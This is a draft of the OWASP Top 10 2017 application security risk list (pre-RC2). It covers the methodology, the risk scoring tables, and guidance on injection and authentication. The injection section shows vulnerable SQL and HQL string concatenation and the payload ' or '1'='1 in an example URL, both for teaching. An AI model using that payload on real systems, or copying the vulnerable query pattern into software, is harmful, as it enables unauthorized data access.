<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="generator" content="pandoc">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title></title>
  <style type="text/css">code{white-space: pre;}</style>
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
</head>
<body>
<p><img src="images/OWASP_logo.png" alt="OWASP LOGO" /></p>
<h2 id="owasp-top-10-2017-master-pre-rc2">OWASP Top 10 2017-master (pre-RC2)</h2>
<p>October 17, 2017 (Andrew's birthday)</p>
<p>DRAFT STANDARD.</p>
<p>Comments welcome - <a href="https://github.com/OWASP/Top10/issues" class="uri">https://github.com/OWASP/Top10/issues</a></p>
<h1 id="important-notice">Important Notice</h1>
<p>This version is not a final draft.</p>
<p>We have worked extensively to validate the methodology, obtained a great deal of data on over 114,000 apps, and obtained qualitive data via survey by 550 community members on the two new categories - deserialization and insufficient logging and monitoring.</p>
<p>We strongly urge for any corrections or issues to be logged at GitHub</p>
<ul>
<li><a href="https://github.com/OWASP/Top10/issues" class="uri">https://github.com/OWASP/Top10/issues</a></li>
</ul>
<p>Through public transparency, we provide traceability and ensure that all voices are heard during this final month before publication.</p>
<ul>
<li>Andrew van der Stock</li>
<li>Brian Glas</li>
<li>Neil Smithline</li>
<li><p>Torsten Gigler</p>
<h1 id="toc">TOC</h1></li>
</ul>
<h1 id="o-about-owasp">O About OWASP</h1>
<h2 id="foreword">Foreword</h2>
<p>Insecure software is undermining our financial, healthcare, defense, energy, and other critical infrastructure. As our software becomes increasingly critical, complex, and connected, the difficulty of achieving application security increases exponentially. The rapid pace of modern software development processes makes risks even more critical to discover quickly and accurately. We can no longer afford to tolerate relatively simple security problems like those presented in this OWASP Top 10.</p>
<p>We received a great deal of feedback during the creation of the OWASP Top 10 2017, more than for any other equivalent OWASP effort. This shows how much passion the community has for the OWASP Top 10, and thus how critical it is for OWASP to get the Top 10 right for the majority of use cases.</p>
<p>Although the original goal of the OWASP Top 10 project was simply to raise awareness amongst developers, it has become <em>the</em> de facto application security standard. We have taken steps in this release to firm up the definition of issues, and improve the recommendations to be leading practices that may be adopted as an application security standard that covers off around 80-90% of all common attacks and threats. We encourage large and high performing organizations to use the <a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project">OWASP Application Security Verification Standard</a> if a true standard is required, but for most, the OWASP Top 10 is a great start on the application security journey.</p>
<p>We have written up a range of suggested next steps for different users of the OWASP Top 10, including &quot;What's next for developers&quot;, &quot;What's next for testers&quot;, &quot;What's next for organizations&quot; which is suitable for CIO's and CISO's, &quot;What's next for application managers&quot;, which is suitable for application owners.</p>
<p>In the long term, we encourage all software development teams and organizations to create an application security program that is compatible with your culture and technology. These programs come in all shapes and sizes. Leverage your organization's existing strengths to do and measure what works for you.</p>
<p>We hope that the OWASP Top 10 is useful to your application security efforts. Please don't hesitate to contact OWASP with your questions, comments, and ideas at our GitHub project repository:</p>
<ul>
<li><a href="https://github.com/OWASP/Top10/issues" class="uri">https://github.com/OWASP/Top10/issues</a></li>
</ul>
<p>Lastly, we wish to thank the founding leadership of the OWASP Top 10 project, Dave Wichers and Jeff Williams for all their efforts, and believing in us to get this finished with the community's help. Thank you!</p>
<ul>
<li>Torsten Gigler</li>
<li>Brian Glas</li>
<li>Neil Smithline</li>
<li>Andrew van der Stock</li>
</ul>
<h2 id="about-owasp">About OWASP</h2>
<p>The Open Web Application Security Project (OWASP) is an open community dedicated to enabling organizations to develop, purchase, and maintain applications and APIs that can be trusted. At OWASP you'll find free and open ...</p>
<ul>
<li>Application security tools and standards</li>
<li>Complete books on application security testing, secure code development, and secure code review</li>
<li>Standard security controls and libraries</li>
<li>Local chapters worldwide</li>
<li>Cutting edge research</li>
<li>Extensive conferences worldwide</li>
<li>Mailing lists</li>
</ul>
<p>Learn more at: <a href="https://www.owasp.org" class="uri">https://www.owasp.org</a></p>
<p>All of the OWASP tools, documents, forums, and chapters are free and open to anyone interested in improving application security. We advocate approaching application security as a people, process, and technology problem, because the most effective approaches to application security require improvements in these areas.</p>
<p>OWASP is a new kind of organization. Our freedom from commercial pressures allows us to provide unbiased, practical, cost-effective information about application security. OWASP is not affiliated with any technology company, although we support the informed use of commercial security technology. OWASP produces many types of materials in a collaborative, transparent and open way.</p>
<p>The OWASP Foundation is the non-profit entity that ensures the project's long-term success. Almost everyone associated with OWASP is a volunteer, including the OWASP Board, Chapter Leaders, Project Leaders, and project members. We support innovative security research with grants and infrastructure.</p>
<p>Come join us!</p>
<h2 id="copyright-and-license">Copyright and License</h2>
<p><img src="images/license.png" alt="license" /></p>
<p>Copyright © 2003-2017 The OWASP Foundation. This document is released under the Creative Commons Attribution ShareAlike 3.0 license. For any reuse or distribution, you must make clear to others the license terms of this work.</p>
<p>Project Leads, OWASP Top 10 2017 post RC1 to Final</p>
<table>
<thead>
<tr class="header">
<th>Project Leads</th>
<th>Lead Authors</th>
<th>Contributors and Reviewers</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Torsten Gigler, Brian Glas, Neil Smithline, Andrew van der Stock</td>
<td>TBA</td>
<td>TBA</td>
</tr>
</tbody>
</table>
<p>Project Leads, OWASP Top 10 2017 to RC1</p>
<table>
<thead>
<tr class="header">
<th>Project Leads</th>
<th>Lead Authors</th>
<th>Contributors and Reviewers</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Dave Wichers</td>
<td>Dave Wichers, Jeff Williams</td>
<td>TBA</td>
</tr>
</tbody>
</table>
<h1 id="introduction">Introduction</h1>
<h2 id="welcome">Welcome</h2>
<p>Welcome to the OWASP Top 10 2017! This major update adds several new issues, including two issues selected by the community - A8:2017-Deserialization and A10:2017-Insufficient logging and monitoring. Community feedback also drove the collection of the most amount of data ever assembled in the preparation of an application security standard, and so we are confident that the remaining 8 issues are the most important for organizations to address, particularly the A3:2017-Exposure of Sensitive Data in the age of the EU's General Data Protection Regulation, A5:2017-Misconfiguration especially around cloud and API services, and A9:2017 Known Vulnerabilities, which can be especially challenging for those on modern platforms, like node.js.</p>
<p>The OWASP Top 10 for 2017 is based primarily on TBA large datasets from firms that specialize in application security, including TBA consulting companies and TBA product vendors. This data spans vulnerabilities gathered from hundreds of organizations and over 114,000 real-world applications and APIs. The Top 10 items are selected and prioritized according to this prevalence data, in combination with consensus estimates of exploitability, detectability, and impact.</p>
<p>A primary aim of the OWASP Top 10 is to educate developers, designers, architects, managers, and organizations about the consequences of the most common and most important web application security weaknesses. The Top 10 provides basic techniques to protect against these high risk problem areas – and also provides guidance on where to go from here.</p>
<h2 id="warnings">Warnings</h2>
<p><strong>Don't stop at 10</strong>. There are hundreds of issues that could affect the overall security of a web application as discussed in the <a href="https://www.owasp.org/index.php/OWASP_Guide_Project">OWASP Developer's Guide</a> and the <a href="https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series">OWASP Cheat Sheet Series</a>. These are essential reading for anyone developing web applications and APIs. Guidance on how to effectively find vulnerabilities in web applications and APIs is provided in the OWASP Testing Guide and the OWASP Code Review Guide.</p>
<p><strong>Constant change</strong>. The OWASP Top 10 will continue to change. Even without changing a single line of your application's code, you may become vulnerable as new flaws are discovered and attack methods are refined. Please review the advice at the end of the Top 10 in “What's Next For Developers, Verifiers, and Organizations” for more information.</p>
<p><strong>Think positive</strong>. When you're ready to stop chasing vulnerabilities and focus on establishing strong application security controls, OWASP is maintaining and promoting the <a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project">OWASP Application Security Verification Standard (ASVS)</a> as a guide to organizations and application reviewers on what to verify.</p>
<p><strong>Use tools wisely</strong>. Security vulnerabilities can be quite complex and buried in mountains of code. In many cases, the most cost-effective approach for finding and eliminating these weaknesses is human experts armed with good tools.</p>
<p><strong>Push left, right, and everywhere</strong>. Focus on making security an integral part of your culture throughout your development organization. Find out more in the <a href="">OWASP Software Assurance Maturity Model (SAMM)</a>.</p>
<h2 id="attribution">Attribution</h2>
<p>We'd like to thank the many organizations that contributed their vulnerability prevalence data to support the 2017 update, including these large data set providers:</p>
<ul>
<li>Aspect Security, AsTech Consulting, Branding Brand, Contrast Security, EdgeScan, iBLISS, Minded Security, Paladion Networks, Softtek, Vantage Point, Veracode</li>
</ul>
<p>For the first time, all the data contributed to a Top 10 release, and the full list of contributors, is publicly available.</p>
<p>We would like to thank in advance those who contribute significant constructive comments and time reviewing this update to the Top 10 and to:</p>
<ul>
<li>TBA (List of contributors from GitHub issues)</li>
</ul>
<p>And finally, we'd like to thank in advance all the translators out there that will translate this release of the Top 10 into numerous different languages, helping to make the OWASP Top 10 more accessible to the entire planet.</p>
<h1 id="rn-release-notes">RN Release Notes</h1>
<h2 id="what-changed-from-2013-to-2017">What changed from 2013 to 2017?</h2>
<p>Over the last decade, and in particularly these last few years, the fundamental architecture of applications has changed significantly:</p>
<ul>
<li>JavaScript is now the primary language of the web. node.js and modern web frameworks such as Bootstrap, Electron, Angular, React amongst many others, means source that was once on the server is now running on untrusted browsers.</li>
<li>Single page applications. Modern frameworks such as Angular and React allow the creation of highly modular front end user experiences, which integrate with...</li>
<li>microservices. Older enterprise service bus applications using EJBs and so on, have been ported to node.js and Spring Boot microservices. Old code that never expected to be communicated directly from the Internet is now an API or RESTful web service. The assumptions that underlie this code, such as trusted callers, is simply not valid.</li>
</ul>
<p>Change has accelerated over the last five years, and the OWASP Top 10 needed to change. We've completely refactored the OWASP Top 10, revamped the methodology, tested a new data call process, worked with the community, re-ordered our risks, re-written each risk from the ground up, and added in modern references to frameworks and languages that are now commonly used.</p>
<p>In this 2017 release, we made the following changes:</p>
<table style="width:8%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th>OWASP Top 10 2013</th>
<th>OWASP Top 10 2017</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>A1 - Injection</td>
<td>A1:2017 Injection</td>
</tr>
<tr class="even">
<td>A2 - Broken authentication and session management</td>
<td>A2:2017-Authentication</td>
</tr>
<tr class="odd">
<td>A3 - Cross-site scripting</td>
<td>A3:2017-Sensitive Information Disclosure</td>
</tr>
<tr class="even">
<td>A4 - Insecure direct object references</td>
<td>A4:2017-XML External Entities [NEW]</td>
</tr>
<tr class="odd">
<td>A5 - Security Misconfiguration</td>
<td>A5:2017-Security Misconfiguration</td>
</tr>
<tr class="even">
<td>A6 - Sensitive Data Exposure</td>
<td>A6:2017-Access Control</td>
</tr>
<tr class="odd">
<td>A7 - Missing Function Level Access Control</td>
<td>A7:2017-XSS</td>
</tr>
<tr class="even">
<td>A8 - Cross-site Request Forgery (CSRF)</td>
<td>A8:2017-Deserialization [NEW, Community]</td>
</tr>
<tr class="odd">
<td>A9 - Known Vulnerabilities</td>
<td>A9:2017-Known Vulnerabilities</td>
</tr>
<tr class="even">
<td>A10 - Unvalidated redirects and forwards</td>
<td>A10:2017-Insufficient Logging and Monitoring [NEW, Community]</td>
</tr>
</tbody>
</table>
<p>NB: Although most of these issues are weaknesses, the last one is missing or ineffective controls. It has two CWE entries, but in this case, not only did the community rank this issue, we felt if we didn't include detection and response in the OWASP Top 10 2017, we'd be negligent in our duties to the wider development community. With firewalls, logging, network IPS and endpoint protection systems unable to detect web hacks, it falls on web apps themselves to be the new firewall, especially for cloud-based microservices, where there is no firewall, no IPS, and no end points.</p>
<h2 id="new-issues-supported-by-data">New issues, supported by data</h2>
<p>A4:2017-XML External Entity (XXE) is a new category primarily supported by SAST data sets, but when discovered by penetration testers and dynamic tools, this new issue allows attackers to disclose internal information, scan internal systems, and possibly perform denial of service attacks.</p>
<h2 id="new-issues-supported-by-the-community">New issues, supported by the community</h2>
<p>We asked the community to provide insight into two forward looking weakness categories. After 550 peer submissions, and after removing issues that were already supported by data (such as Sensitive Data Exposure and XXE), the two new issues are A8:2017-Deserialization, responsible for one of the worst breaches of all time, and A10:2017-Insufficient Logging and Monitoring, the lack of which can prevent or significantly delay malicious activity and breach detection, incident response and digital forensics.</p>
<h2 id="retired-but-not-forgotten">Retired, but not forgotten</h2>
<ul>
<li><strong>A4 Insecure direct object references</strong> and A7 Missing function level access control. We have merged these two issues into a single access control finding, as the impacts and prevention recommendations are more or less identical. This allows us to free up an additional issue, which is XXE.</li>
<li><strong>A8 CSRF</strong> - After being inserted with little data in the OWASP Top 10 2007, when 100% of applications were vulnerable to CSRF, the OWASP Top 10 has served its purpose by including this issue, and it now is found in less than 2% of all applications.</li>
<li><strong>A10 Unvalidated redirects and forwards</strong>. Although this issue is a relative of XSS, and injections more broadly, the actual CWE issue has fallen out of the 10 positions available. As this issue is automatically detected by both DAST and SAST tools, we encourage organizations and vendors to keep on reporting on this issue.</li>
</ul>
<h1 id="f-details-about-risk-factors">+F Details about Risk factors</h1>
<h2 id="top-10-risk-factor-summary">Top 10 Risk Factor Summary</h2>
<p>The following table presents a summary of the 2017 Top 10 Application Security Risks, and the risk factors we have assigned to each risk. These factors were determined based on the available statistics and the experience of the OWASP Top 10 team.</p>
<table>
<thead>
<tr class="header">
<th>Risk</th>
<th>Exploitability</th>
<th>Prevalence</th>
<th>Detectability</th>
<th>Impact</th>
<th>Score</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>A1:2017 Injection</td>
<td>EASY</td>
<td>COMMON</td>
<td>EASY</td>
<td>SEVERE</td>
<td>8.0</td>
</tr>
<tr class="even">
<td>A2:2017 Authentication</td>
<td>EASY</td>
<td>COMMON</td>
<td>AVERAGE</td>
<td>SEVERE</td>
<td>7.0</td>
</tr>
<tr class="odd">
<td>A3:2017 Sensitive data exposure</td>
<td>AVERAGE</td>
<td>WIDESPREAD</td>
<td>AVERAGE</td>
<td>SEVERE</td>
<td>7.0</td>
</tr>
<tr class="even">
<td>A4:2017 XXE</td>
<td>AVERAGE</td>
<td>COMMON</td>
<td>EASY</td>
<td>SEVERE</td>
<td>7.0</td>
</tr>
<tr class="odd">
<td>A5:2017 Misconfig</td>
<td>EASY</td>
<td>PREVALENT</td>
<td>EASY</td>
<td>MODERATE</td>
<td>6.7</td>
</tr>
<tr class="even">
<td>A6:2017 Access Control</td>
<td>AVERAGE</td>
<td>COMMON</td>
<td>AVERAGE</td>
<td>SEVERE</td>
<td>6.0</td>
</tr>
<tr class="odd">
<td>A7:2017 XSS</td>
<td>EASY</td>
<td>WIDESPREAD</td>
<td>EASY</td>
<td>MODERATE</td>
<td>6.0</td>
</tr>
<tr class="even">
<td>A8:2017 Deserialization</td>
<td>DIFFICULT</td>
<td>COMMON</td>
<td>AVERAGE</td>
<td>SEVERE</td>
<td>5.0</td>
</tr>
<tr class="odd">
<td>A9:2017 Components</td>
<td>AVERAGE</td>
<td>WIDESPREAD</td>
<td>AVERAGE</td>
<td>MODERATE</td>
<td>4.7</td>
</tr>
<tr class="even">
<td>A10:2017 Logging and monitoring</td>
<td>AVERAGE</td>
<td>WIDESPREAD</td>
<td>DIFFICULT</td>
<td>MODERATE</td>
<td>4.0</td>
</tr>
</tbody>
</table>
<p>A8 and A10 come from survey data, which is discussed in the TBA chapter. The two residual issues that did not have data to be included in their own right were deserialization (514/740) and insufficient logging and monitoring (440/740). The other survey items entered the OWASP Top 10 in their own right.</p>
<p>To understand these risks for a particular application or organization, you must consider your own specific threat agents and business impacts. Even major software weaknesses may not present a serious risk if there are no threat agents in a position to perform the necessary attack or the business impact is negligible for the assets involved.</p>
<h2 id="additional-risks-to-consider">Additional Risks To Consider</h2>
<p>Every Top 10 requires us to make a judgement call as to what is included, and how far we can include other associated weaknesses into a single risk. This year is no different. If you want to look further, consider the following weaknesses for which we have significant data:</p>
<p><strong>High Privacy impacts</strong></p>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/310.html">Cryptographic Issues (CWEs-310/326/327/etc)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/319.html">Cleartext Transmission of Sensitive Information (CWE-319)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/312.html">Cleartext Storage of Sensitive Information (CWE-312)</a></li>
</ul>
<p>See the <a href="https://www.owasp.org/index.php/OWASP_Top_10_Privacy_Risks_Project">OWASP Top 10 Privacy Risks</a> for more information.</p>
<p><strong>High technical impacts</strong></p>
<p>We do not have strong evidence for these issues, but the impact can be high:</p>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/918.html">Server-Side Request Forgery (SSRF) (CWE-918)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/434.html">Unrestricted Upload of File with Dangerous Type (CWE-434)</a></li>
</ul>
<p><strong>Technical impacts</strong></p>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/451.html">Clickjacking (CWE-451)</a> or <a href="https://capec.mitre.org/data/definitions/103.html">CAPEC 103</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/352.html">Cross-Site Request Forgery (CSRF) (CWE-352)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/384.html">Session Fixation (CWE-384)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/22.html">Path Traversal (CWE-22)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/799.html">Insufficient Anti-automation (CWE-799)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/400.html">Denial of Service (DOS) (CWE-400)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/915.html">Mass Assignment (CWE-915)</a></li>
</ul>
<h1 id="r-about-risks">+R About Risks</h1>
<h2 id="about-risks">About risks</h2>
<p>During the creation of the OWASP Top 10 2017, we asked the community how they would like the issues to be presented. The overwhelming majority of respondents asked for risk-based ranking. It would be simpler for us to use prevalence only, or breach only ordering, because we have solid access data on that, but then we wouldn't be presenting risks.</p>
<p>ISO 31000 is the international standard for risk management. We aim to adhere to that standard, but we only include technical impact, and not business impact. Every ISO 31000 compliant organization adopting the OWASP Top 10 should add their business impact to our calculations. Why is this important? Consider the case where a CMS is used as a public website by one organization, and as a health records system by another. The data asset, risks and threats are very different, and yet the software is the same.</p>
<p>We present three likelihood factors:</p>
<ul>
<li>Exploitability - based upon our combined experience of if the issue is difficult to exploit requiring advanced skills uncommon in the industry, average, or easy (automated)</li>
<li>Prevalence - comes unmodified from the 114,000 application data set</li>
<li>Detectability - difficult or blind, average or easy (automated) detection</li>
</ul>
<p>Impact is purely a technical impact, which we based upon our experience, history of breaches using this issue, and reputable sources such as the annual Verizon Data Breach Incident Report.</p>
<h2 id="defining-our-terms">Defining our terms</h2>
<p>One of the long standing tensions within the information security industry is the misunderstanding or misuse of common terms, such as threats, threat agents, weaknesses, defects, flaws, vulnerabilities, and risks. As such, we are defining our terms to ensure that there is no confusion.</p>
<table style="width:11%;">
<colgroup>
<col style="width: 5%" />
<col style="width: 5%" />
</colgroup>
<thead>
<tr class="header">
<th>Term</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Data asset</td>
<td>A data asset is something tangible processed and stored by an application or API, such as an identity store, customer database, health records, tax returns, bank or mortgage accounts, and so on.</td>
</tr>
<tr class="even">
<td>Threat agent</td>
<td>Threat agents can be humans, with or or without motives, or even in some cases, scripts (such as botnets or worms). Outside of criminal prosecutions and state response, the identity of a threat actor is only important in terms of understanding the sorts of targets and actions the threat agent is likely to target to assist in forensics and incident response.</td>
</tr>
<tr class="odd">
<td>Weakness</td>
<td>A weakness is a software architectural or design flaw or technical defect that allows a threat agent to exploit a vulnerability within the code. The likelihood of this occurring is well understood within the application security industry.</td>
</tr>
<tr class="even">
<td>Flaw</td>
<td>A flaw is a requirements, architecture, or design mistake that will take considerable effort to refactor or mitigate</td>
</tr>
<tr class="odd">
<td>Defect</td>
<td>A defect is a bug or a piece of code that fails to properly use an effective control</td>
</tr>
<tr class="even">
<td>Control</td>
<td>A control is a piece of code, process or people that mitigates</td>
</tr>
<tr class="odd">
<td>Impact</td>
<td>The impact of a threat agent exploiting a vulnerability is highly dependant on the data asset being processed, stored or protected by the application or API. However, for these 10 vulnerability classes, we can estimate a baseline impact based upon public breach information, such as Dataloss DB, media coverage, and financial impact for publicly listed companies.</td>
</tr>
</tbody>
</table>
<p>Our methodology includes three likelihood factors for each weakness (prevalence, detectability, and ease of exploit) and one impact factor (technical impact). The prevalence of a weakness is a factor that you typically don't have to calculate. For prevalence data, we have been supplied prevalence statistics from a number of different organizations (as referenced in the Attribution section on page 4) and we have averaged their data together to come up with a Top 10 likelihood of existence list by prevalence. This data was then combined with the other two likelihood factors (detectability and ease of exploit) to calculate a likelihood rating for each weakness. The likelihood rating was then multiplied by our estimated average technical impact for each item to come up with an overall risk ranking for each item in the Top 10.</p>
<p>Note that this approach does not take the likelihood of the threat agent into account. Nor does it account for any of the various technical details associated with your particular application. Any of these factors could significantly affect the overall likelihood of an attacker finding and exploiting a particular vulnerability. This rating also does not take into account the actual impact on your business. Your organization will have to decide how much security risk from applications and APIs the organization is willing to accept given your culture, industry, and regulatory environment. The purpose of the OWASP Top 10 is not to do this risk analysis for you.</p>
<p>The following illustrates our calculation of the risk for A5:2017 Security Misconfiguration, as an example. Misconfiguration is so prevalent it warranted the only 'PREVALENT' prevalence value of 4. All other risks ranged from uncommon to common (values 1 to 3).</p>
<h1 id="a1-injections">A1 Injections</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th>Threat agents/Attack vectors</th>
<th>Security Weakness</th>
<th>Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Access Lvl \</td>
<td>Exploitability</td>
<td>Prevalence \</td>
</tr>
<tr class="even">
<td>Consider anyone who can send untrusted data to the system sends simple text-based attacks that exploit the syntax of the targeted interpreter. Almost any source of data can be an injection vector, including internal sources.</td>
<td>Injection flaws occur when an application sends untrusted data to an interpreter. Injection flaws are very prevalent, particularly in legacy code. They are often found in SQL, LDAP, XPath, or NoSQL queries; OS commands; XML parsers, SMTP Headers, expression languages, etc. Injection flaws are easy to discover when examining code, but frequently hard to discover via testing. Scanners and fuzzers can help attackers find injection flaws.</td>
<td>Injection can result in data loss or corruption, lack of accountability, or denial of access. Injection can sometimes lead to complete host takeover. The business impact depends on the protection needs of your application and data.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-attack">Am I vulnerable to attack?</h2>
<p>The best way to find out if an application is vulnerable to injection is to verify that all use of interpreters clearly separates untrusted data from the command or query. In many cases, it is recommended to avoid the interpreter, or disable it (e.g., XXE), if possible. For SQL calls, use bind variables in all prepared statements and stored procedures, or avoid dynamic queries.</p>
<p>Checking the code is a fast and accurate way to see if the application uses interpreters safely. Code analysis tools can help a security analyst find use of interpreters and trace data flow through the application. Penetration testers can validate these issues by crafting exploits that confirm the vulnerability.</p>
<p>Automated dynamic scanning which exercises the application may provide insight into whether some exploitable injection flaws exist. Scanners cannot always reach interpreters and have difficulty detecting whether an attack was successful. Poor error handling makes injection flaws easier to discover.</p>
<h2 id="how-do-i-prevent">How do I prevent</h2>
<p>Preventing injection requires keeping untrusted data separate from commands and queries.</p>
<ol>
<li><p>The preferred option is to use a safe API which avoids the use of the interpreter entirely or provides a parameterized interface. Be careful with APIs, such as stored procedures, that are parameterized, but can still introduce injection under the hood.</p></li>
<li><p>If (1) is not available, you should escape special characters using the specific escape syntax for that interpreter. OWASP's Java Encoder and similar libraries provide such escaping routines.</p></li>
<li><p>Positive or &quot;white list&quot; input validation is also recommended, but is not a complete defense as many situations require special characters be allowed. If special characters are required, only approaches (1) and (2) above will make their use safe.</p></li>
</ol>
<h2 id="example-scenarios">Example Scenarios</h2>
<p>Scenario #1: An application uses untrusted data in the construction of the following vulnerable SQL call:</p>
<p><code>String query = &quot;SELECT * FROM accounts WHERE custID='&quot; + request.getParameter(&quot;id&quot;) + &quot;'&quot;;</code></p>
<p>Scenario #2: Similarly, an application's blind trust in frameworks may result in queries that are still vulnerable, (e.g., Hibernate Query Language (HQL)):</p>
<p><code>Query HQLQuery = session.createQuery(&quot;FROM accounts WHERE custID='&quot; + request.getParameter(&quot;id&quot;) + &quot;'&quot;);</code></p>
<p>In both cases, the attacker modifies the 'id' parameter value in her browser to send: <code>' or '1'='1</code>. For example:</p>
<p><code>http://example.com/app/accountView?id=' or '1'='1</code></p>
<p>This changes the meaning of both queries to return all the records from the accounts table. More dangerous attacks could modify data or even invoke stored procedures.</p>
<h2 id="references">References</h2>
<h3 id="owasp">OWASP</h3>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#2:_Parameterize_Queries">OWASP Proactive Controls - Parameterize Queries</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project">OWASP Application Security Verification Standard - V5 Input Validation and Encoding</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)">OWASP Testing Guide: Testing for SQL Injection</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)">OWASP Testing Guide: Testing for Command Injection</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_ORM_Injection_(OTG-INPVAL-007)">OWASP Testing Guide: Testing for ORM injection</a></li>
<li><a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet">OWASP SQL Injection Prevention Cheat Sheet</a></li>
<li><a href="https://www.owasp.org/index.php/Injection_Prevention_Cheat_Sheet_in_Java">OWASP Injection Cheat Sheet for Java</a></li>
<li><a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet">OWASP Query Parameterization Cheat Sheet</a></li>
<li><a href="https://www.owasp.org/index.php/Command_Injection_Defense_Cheat_Sheet">OWASP Command Injection Defense Cheat Sheet</a></li>
</ul>
<h3 id="external">External</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77 Command Injection</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89 SQL Injection</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/564.html">CWE-564 Hibernate Injection</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/917.html">CWE-917 Expression Language Injection</a></li>
<li><a href="https://portswigger.net/knowledgebase/issues/details/00101080_serversidetemplateinjection">PortSwigger: Server-side template injection</a></li>
</ul>
<h1 id="a2-authentication">A2 Authentication</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th>Threat agents/Attack vectors</th>
<th>Security Weakness</th>
<th>Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Access Lvl \</td>
<td>Exploitability</td>
<td>Prevalence \</td>
</tr>
<tr class="even">
<td>Attackers have access to hundreds of millions of valid username and password combinations for credential stuffing, default administrative account lists, automated brute force and dictionary attack tools, and advanced GPU cracking tools.</td>
<td>Every application that does not support multi-factor authentication, rate limit login calls, or risk based login controls is vulnerable to attack</td>
<td>Attackers only have to crack access to a few accounts, or even just one administrator level account to access the data held by the system. For financial apps, this may allow money laundering; for tax apps, this might allow social security fraud or identity theft; for health apps, this might disclose legally protected highly sensitive information.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-attack-1">Am I vulnerable to attack?</h2>
<p>Evidence of identity, authentication and session management are critical for separating malicious unauthenticated attackers with users who you might have a legal relationship.</p>
<p>Common authentication vulnerabilities include:</p>
<ul>
<li>permits credential stuffing, which is where the attacker has a list of valid usernames and passwords</li>
<li>permits brute force or other automated attacks</li>
<li>permits default, weak or well-known passwords, such as &quot;Password1&quot; or &quot;admin/admin&quot;</li>
<li>weak or ineffectual credential recovery and forgot password processes, such as &quot;knowledge-based answers&quot;, which cannot be made safe</li>
<li>plain text, encrypted, or weakly hashed passwords permit the rapid recovery of passwords using GPU crackers or brute force tools</li>
<li>Missing or ineffective multi-factor authentication</li>
</ul>
<h2 id="how-do-i-prevent-1">How do I prevent</h2>
<ul>
<li><a href="https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet#Leverage_an_adaptive_one-way_function">Store passwords using a modern one way hash function</a>, such as Argon2, with sufficient work factor to prevent realistic GPU cracking attacks</li>
<li>Implement multi-factor authentication where possible to prevent credential stuffing, brute force, automated, and stolen credential attacks</li>
<li>Implement rate limiting to limit the impact of automated attacks, credential stuffing, brute force, and default password attacks</li>
<li>Implement weak password checks, such as testing a new password against a list of the top 10000 worst passwords</li>
<li>Do not ship with default credentials, particularly for admin users</li>
<li>Permit users to logout, and enforce logout on the server</li>
<li>Log authentication failures, such that alerting administrators when credential stuffing, brute force or other attacks</li>
</ul>
<p>Larger organizations should consider using a federated identity product or service that includes evidence of identity, common identity attack protections, multi-factor authentication, monitoring and alerting of identity misuse.</p>
<p>Please review the <a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#5:_Implement_Identity_and_Authentication_Controls">OWASP Proactive Controls</a> for high level overview of authentication controls, or the <a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home">OWASP Application Security Verification Standard</a>, chapters V2 and V3 for a detailed set of requirements as per the risk level of your application</p>
<h2 id="example-scenarios-1">Example Scenarios</h2>
<p><em>Scenario #1:</em> The primary authentication attack in 2017 is <a href="https://www.owasp.org/index.php/Credential_stuffing">credential stuffing</a>, where billions of valid usernames and passwords are known to attackers. If an application does not rate limit authentication attempts, the application can be used as a password oracle to determine if the credentials are valid within the application, which can then be sold or misused easily.</p>
<p><em>Scenario #2:</em> Most authentication attacks occur due to the continued use of passwords as a sole factor. Common issues with passwords include password rotation and complexity requirements, which encourages users to use weak passwords they reuse everywhere. Organizations are strongly recommended to stop password rotation and complexity requirements as per NIST 800-63, and mandating the use of multi-factor authentication.</p>
